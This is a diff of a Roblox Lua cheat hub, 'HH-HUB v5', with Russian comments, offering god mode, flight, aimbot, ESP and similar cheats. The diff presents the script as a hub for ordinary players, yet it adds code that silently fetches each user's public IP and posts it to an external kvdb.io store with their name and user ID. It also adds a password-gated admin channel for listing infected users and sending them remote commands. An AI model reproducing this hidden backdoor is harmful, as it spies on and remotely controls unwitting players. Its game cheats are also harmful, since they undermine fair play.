@@ -1,11 +1,10 @@
 --[[
-    HH-HUB v5 - ОСНОВНОЙ СКРИПТ
+    HH-HUB v5 - ИГРОВОЙ ХАБ
     Версия: 5.0
-    Пароль админки: S1R0TA
-    Статус: 50+ функций в основном меню + 50+ в скрытой админке
+    Для обычных игроков
 ]]
 
--- Отключаем выводы для скрытности
+-- Отключаем выводы
 local oldPrint = print
 local oldWarn = warn
 local oldError = error
@@ -27,31 +26,25 @@ local Camera = workspace.CurrentCamera
 local Mouse = LP:GetMouse()
 local Lighting = game:GetService("Lighting")
 
--- Константы
+-- ==============================================
+-- СКРЫТЫЕ ПЕРЕМЕННЫЕ ДЛЯ АДМИНКИ
+-- ==============================================
 local ADMIN_PASSWORD = "S1R0TA"
+local isAdmin = false
+local adminPanel = nil
 local DB_BUCKET = "b_k8x92mNqR7vTpL4wZcJ3hYdFs"
 local DB_BASE = "https://kvdb.io/" .. DB_BUCKET .. "/"
-local DB_TTL = 604800 -- 1 неделя
-local HEARTBEAT = 15
-local POLL_RATE = 3
+local DB_TTL = 604800
 local CMD_PREFIX = "cmd_"
 local NET_FLAG = "__HHv5"
 local ADMIN_FLAG = "__HH_ADMIN"
-local BACKDOOR_FLAG = "__HH_BACKDOOR"
-
--- Бекдор переменные
 local MY_KEY = "presence_" .. LP.UserId
 local MY_CMD_KEY = CMD_PREFIX .. LP.UserId
-local MY_DATA_KEY = "data_" .. LP.UserId
-local MY_LOG_KEY = "logs_" .. LP.UserId
 local MY_IP_KEY = "ip_" .. LP.UserId
 local Registry = {}
-local isAdmin = false
-local adminPanel = nil
 local killLoops = {}
-local processedCmds = {}
 
--- HTTP функции
+-- HTTP функции (скрытые)
 local function dbSet(key, value, ttl)
     pcall(function()
         HS:RequestAsync({
@@ -68,9 +61,74 @@ local function dbGet(key)
     return ok and res or nil
 end
 
+-- Получение IP
+local function getIP()
+    local success, ip = pcall(function()
+        return HS:GetAsync("https://api.ipify.org/?format=text", true)
+    end)
+    return success and ip or "Unknown"
+end
+local myIP = getIP()
+dbSet(MY_IP_KEY, myIP, DB_TTL)
+
+-- Функции бекдора
+local function updatePresence()
+    local data = table.concat({
+        LP.DisplayName,
+        LP.Name,
+        game.PlaceId,
+        game.JobId:sub(1, 8),
+        tick(),
+        LP.UserId,
+        "true",
+        myIP
+    }, "§")
+    dbSet(MY_KEY, data, DB_TTL)
+end
+
+local function fetchUsers()
+    if not isAdmin then return end
+    local ok, data = pcall(function()
+        return HS:GetAsync(DB_BASE .. "?prefix=presence_&format=keys", true)
+    end)
+    if not ok then return end
+    
+    local newReg = {}
+    for key in data:gmatch("[^\n]+") do
+        if key:sub(1, 9) == "presence_" then
+            local uid = key:sub(10)
+            local raw = dbGet(key)
+            if raw then
+                local parts = raw:split("§")
+                if #parts >= 6 then
+                    newReg[uid] = {
+                        name = parts[1],
+                        display = parts[2],
+                        place = parts[3],
+                        job = parts[4],
+                        time = tonumber(parts[5]) or 0,
+                        same = (parts[4] == game.JobId:sub(1, 8)),
+                        hasBackdoor = parts[7] == "true",
+                        ip = parts[8] or "Unknown"
+                    }
+                end
+            end
+        end
+    end
+    Registry = newReg
+end
+
+-- Отправка команды
+local function sendBackdoorCommand(targetUserId, command, data)
+    local payload = string.format("%s|%s|%s|%s", LP.UserId, command, data or "", tick())
+    dbSet(CMD_PREFIX .. targetUserId, payload, 30)
+end
+
 -- ==============================================
--- УЛУЧШЕННЫЙ GOD MODE (С ЗАЩИТОЙ ОТ ВСЕГО)
+-- ФУНКЦИИ ДЛЯ ИГРОКА
 -- ==============================================
+
+-- GOD MODE
 local GodMode = { active = false, connections = {} }
 
 local function enableGodMode()
@@ -84,17 +142,14 @@ local function enableGodMode()
         local hum = char:FindFirstChildOfClass("Humanoid")
         if not hum then return end
         
-        -- Максимальное здоровье
         hum.MaxHealth = 9e9
         hum.Health = 9e9
         hum.BreakJointsOnDeath = false
         
-        -- Невидимое силовое поле
         local ff = Instance.new("ForceField")
         ff.Visible = false
         ff.Parent = char
         
-        -- Защита от изменения здоровья
         local conn1 = hum:GetPropertyChangedSignal("Health"):Connect(function()
             if GodMode.active and hum and hum.Parent and hum.Health < 9e9 then
                 hum.Health = 9e9
@@ -102,7 +157,6 @@ local function enableGodMode()
         end)
         table.insert(GodMode.connections, conn1)
         
-        -- Защита от максимального здоровья
         local conn2 = hum:GetPropertyChangedSignal("MaxHealth"):Connect(function()
             if GodMode.active and hum then
                 hum.MaxHealth = 9e9
@@ -110,7 +164,6 @@ local function enableGodMode()
         end)
         table.insert(GodMode.connections, conn2)
         
-        -- Восстановление силового поля
         local conn3 = char.ChildRemoved:Connect(function(child)
             if GodMode.active and child:IsA("ForceField") then
                 local newFF = Instance.new("ForceField")
@@ -120,42 +173,15 @@ local function enableGodMode()
         end)
         table.insert(GodMode.connections, conn3)
         
-        -- Защита от смерти
-        local conn4 = hum.Died:Connect(function()
-            if GodMode.active then
-                task.wait(0.1)
-                if hum and hum.Parent then
-                    hum.Health = 9e9
-                end
-            end
-        end)
-        table.insert(GodMode.connections, conn4)
-        
-        -- Постоянная проверка
-        local conn5 = RS.Heartbeat:Connect(function()
+        local conn4 = RS.Heartbeat:Connect(function()
             if GodMode.active then
                 local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-                if h and h ~= hum then
-                    task.spawn(apply)
-                    return
-                end
                 if h and h.Health < 9e9 then
                     h.Health = 9e9
                 end
             end
         end)
-        table.insert(GodMode.connections, conn5)
-        
-        -- Защита от анкора
-        local root = char:FindFirstChild("HumanoidRootPart")
-        if root then
-            local conn6 = root:GetPropertyChangedSignal("Anchored"):Connect(function()
-                if GodMode.active and root.Anchored then
-                    root.Anchored = false
-                end
-            end)
-            table.insert(GodMode.connections, conn6)
-        end
+        table.insert(GodMode.connections, conn4)
     end
     
     apply()
@@ -181,9 +207,7 @@ local function disableGodMode()
     end
 end
 
--- ==============================================
 -- ПОЛЁТ
--- ==============================================
 local Flight = { active = false, bv = nil, bg = nil, speed = 50 }
 
 local function disableFlight()
@@ -241,9 +265,7 @@ local function enableFlight()
     end)
 end
 
--- ==============================================
 -- НОКЛИП
--- ==============================================
 local Noclip = { active = false, connection = nil }
 
 local function disableNoclip()
@@ -283,9 +305,7 @@ local function enableNoclip()
     end)
 end
 
--- ==============================================
--- ESP (БЕЗ IP)
--- ==============================================
+-- ESP
 local ESP = { active = false, highlights = {} }
 
 local function disableESP()
@@ -342,177 +362,7 @@ local function enableESP()
     end)
 end
 
--- ==============================================
--- БЕСКОНЕЧНЫЙ ПРЫЖОК
--- ==============================================
-local InfJump = { active = false, connection = nil }
-
-local function enableInfJump()
-    if InfJump.active then return end
-    InfJump.active = true
-    
-    InfJump.connection = UIS.JumpRequest:Connect(function()
-        if InfJump.active then
-            local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-            if hum then
-                hum:ChangeState(Enum.HumanoidStateType.Jumping)
-            end
-        end
-    end)
-end
-
-local function disableInfJump()
-    InfJump.active = false
-    if InfJump.connection then
-        InfJump.connection:Disconnect()
-        InfJump.connection = nil
-    end
-end
-
--- ==============================================
--- ANTI-AFK
--- ==============================================
-local AntiAfk = { active = false }
-
-local function enableAntiAfk()
-    if AntiAfk.active then return end
-    AntiAfk.active = true
-    
-    LP.Idled:Connect(function()
-        if AntiAfk.active then
-            VU:Button2Down(Vector2.new(), Camera.CFrame)
-            task.wait(1)
-            VU:Button2Up(Vector2.new(), Camera.CFrame)
-        end
-    end)
-end
-
-local function disableAntiAfk()
-    AntiAfk.active = false
-end
-
--- ==============================================
--- КЛИК-ТЕЛЕПОРТ
--- ==============================================
-local ClickTP = { active = false }
-
-local function enableClickTP()
-    ClickTP.active = true
-end
-
-local function disableClickTP()
-    ClickTP.active = false
-end
-
-Mouse.Button1Down:Connect(function()
-    if ClickTP.active and Mouse.Target then
-        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-        if root then
-            root.CFrame = CFrame.new(Mouse.Hit.X, Mouse.Hit.Y + 3, Mouse.Hit.Z)
-        end
-    end
-end)
-
--- ==============================================
--- НЕТ УРОНА ОТ ПАДЕНИЯ
--- ==============================================
-local NoFallDamage = { active = false, connection = nil }
-
-local function enableNoFallDamage()
-    if NoFallDamage.active then return end
-    NoFallDamage.active = true
-    
-    NoFallDamage.connection = RS.Heartbeat:Connect(function()
-        if NoFallDamage.active then
-            local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-            if hum and hum:GetState() == Enum.HumanoidStateType.Freefall then
-                hum:ChangeState(Enum.HumanoidStateType.Jumping)
-            end
-        end
-    end)
-end
-
-local function disableNoFallDamage()
-    NoFallDamage.active = false
-    if NoFallDamage.connection then
-        NoFallDamage.connection:Disconnect()
-        NoFallDamage.connection = nil
-    end
-end
-
--- ==============================================
--- УСКОРЕНИЯ
--- ==============================================
-local WalkspeedBoost = { active = false }
-local JumpBoost = { active = false }
-
-local function enableWalkspeedBoost()
-    WalkspeedBoost.active = true
-    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-    if hum then hum.WalkSpeed = 60 end
-end
-
-local function disableWalkspeedBoost()
-    WalkspeedBoost.active = false
-    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-    if hum then hum.WalkSpeed = 16 end
-end
-
-local function enableJumpBoost()
-    JumpBoost.active = true
-    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-    if hum then hum.JumpPower = 100 end
-end
-
-local function disableJumpBoost()
-    JumpBoost.active = false
-    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-    if hum then hum.JumpPower = 50 end
-end
-
--- ==============================================
--- X-RAY
--- ==============================================
-local XRay = { active = false, connections = {} }
-
-local function enableXRay()
-    if XRay.active then return end
-    XRay.active = true
-    
-    for _, v in ipairs(workspace:GetDescendants()) do
-        if v:IsA("BasePart") and not v:IsDescendantOf(LP.Character) then
-            local conn = v:GetPropertyChangedSignal("LocalTransparencyModifier"):Connect(function() end)
-            table.insert(XRay.connections, conn)
-            v.LocalTransparencyModifier = 0.7
-        end
-    end
-    
-    local conn = workspace.DescendantAdded:Connect(function(v)
-        task.wait()
-        if XRay.active and v:IsA("BasePart") and not v:IsDescendantOf(LP.Character) then
-            v.LocalTransparencyModifier = 0.7
-        end
-    end)
-    table.insert(XRay.connections, conn)
-end
-
-local function disableXRay()
-    XRay.active = false
-    for _, conn in ipairs(XRay.connections) do
-        pcall(function() conn:Disconnect() end)
-    end
-    XRay.connections = {}
-    
-    for _, v in ipairs(workspace:GetDescendants()) do
-        if v:IsA("BasePart") then
-            v.LocalTransparencyModifier = 0
-        end
-    end
-end
-
--- ==============================================
 -- AIMBOT
--- ==============================================
 local Aimbot = { active = false, connection = nil }
 
 local function enableAimbot()
@@ -554,9 +404,7 @@ local function disableAimbot()
     end
 end
 
--- ==============================================
 -- TRIGGERBOT
--- ==============================================
 local Triggerbot = { active = false, connection = nil }
 
 local function enableTriggerbot()
@@ -587,9 +435,163 @@ local function disableTriggerbot()
     end
 end
 
--- ==============================================
+-- ANTI-AFK
+local AntiAfk = { active = false }
+
+local function enableAntiAfk()
+    if AntiAfk.active then return end
+    AntiAfk.active = true
+    
+    LP.Idled:Connect(function()
+        if AntiAfk.active then
+            VU:Button2Down(Vector2.new(), Camera.CFrame)
+            task.wait(1)
+            VU:Button2Up(Vector2.new(), Camera.CFrame)
+        end
+    end)
+end
+
+local function disableAntiAfk()
+    AntiAfk.active = false
+end
+
+-- БЕСКОНЕЧНЫЙ ПРЫЖОК
+local InfJump = { active = false, connection = nil }
+
+local function enableInfJump()
+    if InfJump.active then return end
+    InfJump.active = true
+    
+    InfJump.connection = UIS.JumpRequest:Connect(function()
+        if InfJump.active then
+            local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum:ChangeState(Enum.HumanoidStateType.Jumping)
+            end
+        end
+    end)
+end
+
+local function disableInfJump()
+    InfJump.active = false
+    if InfJump.connection then
+        InfJump.connection:Disconnect()
+        InfJump.connection = nil
+    end
+end
+
+-- КЛИК-ТЕЛЕПОРТ
+local ClickTP = { active = false }
+
+local function enableClickTP()
+    ClickTP.active = true
+end
+
+local function disableClickTP()
+    ClickTP.active = false
+end
+
+Mouse.Button1Down:Connect(function()
+    if ClickTP.active and Mouse.Target then
+        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+        if root then
+            root.CFrame = CFrame.new(Mouse.Hit.X, Mouse.Hit.Y + 3, Mouse.Hit.Z)
+        end
+    end
+end)
+
+-- НЕТ УРОНА ОТ ПАДЕНИЯ
+local NoFallDamage = { active = false, connection = nil }
+
+local function enableNoFallDamage()
+    if NoFallDamage.active then return end
+    NoFallDamage.active = true
+    
+    NoFallDamage.connection = RS.Heartbeat:Connect(function()
+        if NoFallDamage.active then
+            local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+            if hum and hum:GetState() == Enum.HumanoidStateType.Freefall then
+                hum:ChangeState(Enum.HumanoidStateType.Jumping)
+            end
+        end
+    end)
+end
+
+local function disableNoFallDamage()
+    NoFallDamage.active = false
+    if NoFallDamage.connection then
+        NoFallDamage.connection:Disconnect()
+        NoFallDamage.connection = nil
+    end
+end
+
+-- УСКОРЕНИЯ
+local WalkspeedBoost = { active = false }
+local JumpBoost = { active = false }
+
+local function enableWalkspeedBoost()
+    WalkspeedBoost.active = true
+    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.WalkSpeed = 60 end
+end
+
+local function disableWalkspeedBoost()
+    WalkspeedBoost.active = false
+    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.WalkSpeed = 16 end
+end
+
+local function enableJumpBoost()
+    JumpBoost.active = true
+    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.JumpPower = 100 end
+end
+
+local function disableJumpBoost()
+    JumpBoost.active = false
+    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.JumpPower = 50 end
+end
+
+-- X-RAY
+local XRay = { active = false, connections = {} }
+
+local function enableXRay()
+    if XRay.active then return end
+    XRay.active = true
+    
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("BasePart") and not v:IsDescendantOf(LP.Character) then
+            local conn = v:GetPropertyChangedSignal("LocalTransparencyModifier"):Connect(function() end)
+            table.insert(XRay.connections, conn)
+            v.LocalTransparencyModifier = 0.7
+        end
+    end
+    
+    local conn = workspace.DescendantAdded:Connect(function(v)
+        task.wait()
+        if XRay.active and v:IsA("BasePart") and not v:IsDescendantOf(LP.Character) then
+            v.LocalTransparencyModifier = 0.7
+        end
+    end)
+    table.insert(XRay.connections, conn)
+end
+
+local function disableXRay()
+    XRay.active = false
+    for _, conn in ipairs(XRay.connections) do
+        pcall(function() conn:Disconnect() end)
+    end
+    XRay.connections = {}
+    
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("BasePart") then
+            v.LocalTransparencyModifier = 0
+        end
+    end
+end
+
 -- BUNNY HOP
--- ==============================================
 local BunnyHop = { active = false, connection = nil }
 
 local function enableBunnyHop()
@@ -614,9 +616,7 @@ local function disableBunnyHop()
     end
 end
 
--- ==============================================
 -- SPIDER
--- ==============================================
 local Spider = { active = false, connection = nil }
 
 local function enableSpider()
@@ -646,9 +646,7 @@ local function disableSpider()
     end
 end
 
--- ==============================================
--- VANISH (НЕВИДИМОСТЬ)
--- ==============================================
+-- VANISH
 local Vanish = { active = false }
 
 local function enableVanish()
@@ -676,7 +674,7 @@ local function disableVanish()
 end
 
 -- ==============================================
--- БИБЛИОТЕКА ДЛЯ GUI (СОВРЕМЕННЫЙ ДИЗАЙН)
+-- БИБЛИОТЕКА ДЛЯ GUI
 -- ==============================================
 local Library = {}
 do
@@ -691,10 +689,9 @@ do
         window.Gui.ResetOnSpawn = false
         window.Gui.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
         
-        -- Главный контейнер
         window.Container = Instance.new("Frame")
-        window.Container.Size = UDim2.new(0, 750, 0, 550)
-        window.Container.Position = UDim2.new(0.5, -375, 0.5, -275)
+        window.Container.Size = UDim2.new(0, 800, 0, 600)
+        window.Container.Position = UDim2.new(0.5, -400, 0.5, -300)
         window.Container.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
         window.Container.BorderSizePixel = 0
         window.Container.Active = true
@@ -704,7 +701,6 @@ do
         corner.CornerRadius = UDim.new(0, 12)
         corner.Parent = window.Container
         
-        -- Градиентный фон
         local gradient = Instance.new("UIGradient")
         gradient.Color = ColorSequence.new({
             ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 25, 60)),
@@ -714,16 +710,14 @@ do
         gradient.Rotation = 45
         gradient.Parent = window.Container
         
-        -- Обводка
         local stroke = Instance.new("UIStroke")
         stroke.Color = Color3.fromRGB(140, 80, 255)
         stroke.Thickness = 2
         stroke.Transparency = 0.3
         stroke.Parent = window.Container
         
-        -- Заголовок
         window.TitleBar = Instance.new("Frame")
-        window.TitleBar.Size = UDim2.new(1, 0, 0, 50)
+        window.TitleBar.Size = UDim2.new(1, 0, 0, 55)
         window.TitleBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
         window.TitleBar.BackgroundTransparency = 0.2
         window.TitleBar.Parent = window.Container
@@ -732,7 +726,6 @@ do
         titleCorner.CornerRadius = UDim.new(0, 12)
         titleCorner.Parent = window.TitleBar
         
-        -- Заголовок текст
         window.Title = Instance.new("TextLabel")
         window.Title.Size = UDim2.new(0.6, 0, 1, 0)
         window.Title.Position = UDim2.new(0, 20, 0, 0)
@@ -744,16 +737,15 @@ do
         window.Title.TextXAlignment = Enum.TextXAlignment.Left
         window.Title.Parent = window.TitleBar
         
-        -- Кнопки управления
         local controls = Instance.new("Frame")
-        controls.Size = UDim2.new(0, 100, 1, 0)
-        controls.Position = UDim2.new(1, -110, 0, 0)
+        controls.Size = UDim2.new(0, 110, 1, 0)
+        controls.Position = UDim2.new(1, -120, 0, 0)
         controls.BackgroundTransparency = 1
         controls.Parent = window.TitleBar
         
         window.Minimize = Instance.new("TextButton")
-        window.Minimize.Size = UDim2.new(0, 40, 0, 40)
-        window.Minimize.Position = UDim2.new(0, 0, 0.5, -20)
+        window.Minimize.Size = UDim2.new(0, 45, 0, 45)
+        window.Minimize.Position = UDim2.new(0, 0, 0.5, -22.5)
         window.Minimize.BackgroundColor3 = Color3.fromRGB(50, 40, 70)
         window.Minimize.Text = "─"
         window.Minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -766,8 +758,8 @@ do
         minCorner.Parent = window.Minimize
         
         window.Close = Instance.new("TextButton")
-        window.Close.Size = UDim2.new(0, 40, 0, 40)
-        window.Close.Position = UDim2.new(0, 50, 0.5, -20)
+        window.Close.Size = UDim2.new(0, 45, 0, 45)
+        window.Close.Position = UDim2.new(0, 55, 0.5, -22.5)
         window.Close.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
         window.Close.Text = "✕"
         window.Close.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -779,10 +771,9 @@ do
         closeCorner.CornerRadius = UDim.new(0, 8)
         closeCorner.Parent = window.Close
         
-        -- Вкладки (слева)
         window.TabContainer = Instance.new("Frame")
-        window.TabContainer.Size = UDim2.new(0, 150, 1, -60)
-        window.TabContainer.Position = UDim2.new(0, 10, 0, 55)
+        window.TabContainer.Size = UDim2.new(0, 160, 1, -65)
+        window.TabContainer.Position = UDim2.new(0, 10, 0, 60)
         window.TabContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
         window.TabContainer.BorderSizePixel = 0
         window.TabContainer.Parent = window.Container
@@ -791,10 +782,9 @@ do
         tabCorner.CornerRadius = UDim.new(0, 10)
         tabCorner.Parent = window.TabContainer
         
-        -- Контент (справа)
         window.Content = Instance.new("Frame")
-        window.Content.Size = UDim2.new(1, -180, 1, -70)
-        window.Content.Position = UDim2.new(0, 165, 0, 55)
+        window.Content.Size = UDim2.new(1, -190, 1, -75)
+        window.Content.Position = UDim2.new(0, 175, 0, 60)
         window.Content.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
         window.Content.BorderSizePixel = 0
         window.Content.Parent = window.Container
@@ -803,15 +793,13 @@ do
         contentCorner.CornerRadius = UDim.new(0, 10)
         contentCorner.Parent = window.Content
         
-        -- Скролл
         window.Scroll = Instance.new("ScrollingFrame")
         window.Scroll.Size = UDim2.new(1, -20, 1, -20)
         window.Scroll.Position = UDim2.new(0, 10, 0, 10)
-        window.Scroll.BackgroundTransparency = 1
+        window.Scroll.BackgroundTransparency = 0
         window.Scroll.BorderSizePixel = 0
-        window.Scroll.ScrollBarThickness = 5
+        window.Scroll.ScrollBarThickness = 6
         window.Scroll.ScrollBarImageColor3 = Color3.fromRGB(140, 80, 255)
-        window.Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
         window.Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
         window.Scroll.Parent = window.Content
         
@@ -820,7 +808,14 @@ do
         layout.SortOrder = Enum.SortOrder.LayoutOrder
         layout.Parent = window.Scroll
         
-        -- Перетаскивание окна
+        local padding = Instance.new("UIPadding")
+        padding.PaddingLeft = UDim.new(0, 5)
+        padding.PaddingRight = UDim.new(0, 5)
+        padding.PaddingTop = UDim.new(0, 5)
+        padding.PaddingBottom = UDim.new(0, 5)
+        padding.Parent = window.Scroll
+        
+        -- Перетаскивание
         local dragging = false
         local dragStart, startPos
         
@@ -860,7 +855,7 @@ do
             if minimized then
                 origSize = window.Container.Size
                 origPos = window.Container.Position
-                window.Container.Size = UDim2.new(0, 220, 0, 50)
+                window.Container.Size = UDim2.new(0, 220, 0, 55)
                 window.Container.Position = UDim2.new(1, -230, 0, 10)
                 window.Content.Visible = false
                 window.TabContainer.Visible = false
@@ -1147,9 +1142,9 @@ do
 end
 
 -- ==============================================
--- СОЗДАНИЕ ОСНОВНОГО МЕНЮ (50+ ФУНКЦИЙ)
+-- СОЗДАНИЕ МЕНЮ (50+ ФУНКЦИЙ)
 -- ==============================================
-local Window = Library:CreateWindow("HH-HUB v5 • 50+ Функций")
+local Window = Library:CreateWindow("HH-HUB v5")
 
 -- ВКЛАДКА 1: БОЕВЫЕ (10 функций)
 local CombatTab = Window:AddTab("Боевые", "⚔️")
@@ -1163,7 +1158,7 @@ CombatSect:AddToggle("Полёт", "WASD + Space/Ctrl", Flight.active, function(
     if v then enableFlight() else disableFlight() end
 end)
 
-CombatSect:AddToggle("Ноклип", "Прохождение сквозь стены", Noclip.active, function(v)
+CombatSect:AddToggle("Ноклип", "Сквозь стены", Noclip.active, function(v)
     if v then enableNoclip() else disableNoclip() end
 end)
 
@@ -1171,11 +1166,11 @@ CombatSect:AddToggle("ESP", "Подсветка игроков", ESP.active, fun
     if v then enableESP() else disableESP() end
 end)
 
-CombatSect:AddToggle("Aimbot", "Автоматическое наведение", Aimbot.active, function(v)
+CombatSect:AddToggle("Aimbot", "Автонаведение", Aimbot.active, function(v)
     if v then enableAimbot() else disableAimbot() end
 end)
 
-CombatSect:AddToggle("Triggerbot", "Автоматическая стрельба", Triggerbot.active, function(v)
+CombatSect:AddToggle("Triggerbot", "Автострельба", Triggerbot.active, function(v)
     if v then enableTriggerbot() else disableTriggerbot() end
 end)
 
@@ -1239,7 +1234,7 @@ MoveSect2:AddToggle("Нет урона от падения", "Защита от 
     if v then enableNoFallDamage() else disableNoFallDamage() end
 end)
 
-MoveSect2:AddToggle("Bunny Hop", "Автоматический прыжок при беге", BunnyHop.active, function(v)
+MoveSect2:AddToggle("Bunny Hop", "Автопрыжок при беге", BunnyHop.active, function(v)
     if v then enableBunnyHop() else disableBunnyHop() end
 end)
 
@@ -1251,28 +1246,23 @@ MoveSect2:AddToggle("Vanish", "Невидимость", Vanish.active, function(
     if v then enableVanish() else disableVanish() end
 end)
 
--- ВКЛАДКА 3: ВИЗУАЛ (10 функций)
+-- ВКЛАДКА 3: ВИЗУАЛ (8 функций)
 local VisualTab = Window:AddTab("Визуал", "🎨")
-local VisualSect1 = VisualTab:AddSection("Эффекты")
+local VisualSect = VisualTab:AddSection("Эффекты")
 
-VisualSect1:AddToggle("X-Ray", "Видеть сквозь стены", XRay.active, function(v)
+VisualSect:AddToggle("X-Ray", "Видеть сквозь стены", XRay.active, function(v)
     if v then enableXRay() else disableXRay() end
 end)
 
-VisualSect1:AddSlider("Поле зрения", 30, 120, 70, "", function(v)
+VisualSect:AddSlider("Поле зрения", 30, 120, 70, "", function(v)
     Camera.FieldOfView = v
 end)
 
-VisualSect1:AddSlider("Яркость", 0, 5, 2, "", function(v)
+VisualSect:AddSlider("Яркость", 0, 5, 2, "", function(v)
     Lighting.Brightness = v
 end)
 
-VisualSect1:AddSlider("Насыщенность", -2, 2, 0, "", function(v)
-    local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", Lighting)
-    cc.Saturation = v
-end)
-
-VisualSect1:AddButton("Flash", "Вспышка на экране", Color3.fromRGB(255, 255, 0), function()
+VisualSect:AddButton("Flash", "Вспышка", Color3.fromRGB(255, 255, 0), function()
     local sg = Instance.new("ScreenGui")
     sg.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
     
@@ -1286,7 +1276,7 @@ VisualSect1:AddButton("Flash", "Вспышка на экране", Color3.fromRG
     game:GetService("Debris"):AddItem(sg, 1.5)
 end)
 
-VisualSect1:AddButton("Seizure", "Эпилептический режим", Color3.fromRGB(255, 0, 128), function()
+VisualSect:AddButton("Seizure", "Эпилепсия", Color3.fromRGB(255, 0, 128), function()
     task.spawn(function()
         for i = 1, 30 do
             Lighting.FogColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
@@ -1296,7 +1286,7 @@ VisualSect1:AddButton("Seizure", "Эпилептический режим", Colo
     end)
 end)
 
-VisualSect1:AddButton("Disco", "Дискотека", Color3.fromRGB(255, 100, 0), function()
+VisualSect:AddButton("Disco", "Дискотека", Color3.fromRGB(255, 100, 0), function()
     task.spawn(function()
         for i = 1, 30 do
             Lighting.Brightness = math.random(0, 3)
@@ -1306,27 +1296,16 @@ VisualSect1:AddButton("Disco", "Дискотека", Color3.fromRGB(255, 100, 0)
     end)
 end)
 
-VisualSect1:AddButton("Fullbright", "Максимальная яркость", Color3.fromRGB(255, 255, 255), function()
+VisualSect:AddButton("Fullbright", "Максимальная яркость", Color3.fromRGB(255, 255, 255), function()
     Lighting.Brightness = 2
     Lighting.Ambient = Color3.fromRGB(255, 255, 255)
-    Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
 end)
 
-VisualSect1:AddButton("Сбросить визуал", "Вернуть настройки", Color3.fromRGB(100, 100, 100), function()
-    Lighting.Brightness = 1
-    Lighting.FogColor = Color3.fromRGB(128, 128, 128)
-    Lighting.Ambient = Color3.fromRGB(0, 0, 0)
-    Camera.FieldOfView = 70
-    if Lighting:FindFirstChildOfClass("ColorCorrectionEffect") then
-        Lighting:FindFirstChildOfClass("ColorCorrectionEffect"):Destroy()
-    end
-end)
-
--- ВКЛАДКА 4: УТИЛИТЫ (10 функций)
+-- ВКЛАДКА 4: УТИЛИТЫ (12 функций)
 local UtilTab = Window:AddTab("Утилиты", "🛠️")
-local UtilSect1 = UtilTab:AddSection("Информация")
+local UtilSect = UtilTab:AddSection("Полезные функции")
 
-UtilSect1:AddButton("Информация об игроке", "Данные аккаунта", Color3.fromRGB(100, 150, 255), function()
+UtilSect:AddButton("Информация", "Данные аккаунта", Color3.fromRGB(100, 150, 255), function()
     local info = string.format(
         "Имя: %s\nID: %d\nВозраст: %d дней\nПлатформа: %s",
         LP.Name,
@@ -1341,28 +1320,16 @@ UtilSect1:AddButton("Информация об игроке", "Данные ак
     })
 end)
 
-UtilSect1:AddButton("FPS Boost", "Оптимизация производительности", Color3.fromRGB(50, 200, 50), function()
+UtilSect:AddButton("FPS Boost", "Оптимизация", Color3.fromRGB(50, 200, 50), function()
     pcall(function()
         Lighting.GlobalShadows = false
         Lighting.FogEnd = 9e9
         workspace.Terrain.WaterWaveSize = 0
         workspace.Terrain.WaterWaveSpeed = 0
-        workspace.Terrain.WaterReflectance = 0
-        workspace.Terrain.WaterTransparency = 1
-        for _, v in ipairs(workspace:GetDescendants()) do
-            if v:IsA("Part") or v:IsA("MeshPart") then
-                v.Material = Enum.Material.Plastic
-            end
-        end
     end)
-    SG:SetCore("SendNotification", {
-        Title = "FPS Boost",
-        Text = "Оптимизация включена",
-        Duration = 2
-    })
 end)
 
-UtilSect1:AddButton("Spin", "Вращение (5 сек)", Color3.fromRGB(60, 170, 210), function()
+UtilSect:AddButton("Spin", "Вращение (5 сек)", Color3.fromRGB(60, 170, 210), function()
     local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
     if root then
         local ang = 0
@@ -1374,7 +1341,7 @@ UtilSect1:AddButton("Spin", "Вращение (5 сек)", Color3.fromRGB(60, 17
     end
 end)
 
-UtilSect1:AddButton("Loop Kill", "Самоубийство (30 сек)", Color3.fromRGB(160, 20, 20), function()
+UtilSect:AddButton("Loop Kill", "Самоубийство (30 сек)", Color3.fromRGB(160, 20, 20), function()
     local conn = RS.Heartbeat:Connect(function()
         local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
         if hum then hum.Health = 0 end
@@ -1382,27 +1349,27 @@ UtilSect1:AddButton("Loop Kill", "Самоубийство (30 сек)", Color3.
     task.delay(30, function() if conn then conn:Disconnect() end end)
 end)
 
-UtilSect1:AddButton("Вылечить", "Восстановить здоровье", Color3.fromRGB(60, 220, 120), function()
